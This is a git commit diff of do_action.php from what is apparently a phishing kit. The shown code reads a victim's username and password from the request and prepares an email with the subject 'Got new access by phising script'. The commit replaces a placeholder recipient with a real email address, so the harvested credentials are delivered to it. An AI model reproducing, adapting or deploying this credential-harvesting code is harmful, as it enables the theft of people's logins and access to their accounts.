bfbcb9ea15d979a66fc62d52f3f8fdca4fa6640c
Chit-the <85943693+Chit-the@users.noreply.github.com>
2021-06-15 19:48:58 +0630

    Update do_action.php

--- do_action.php
+++ do_action.php
@@ -8,7 +8,7 @@
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "yoechitsan@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
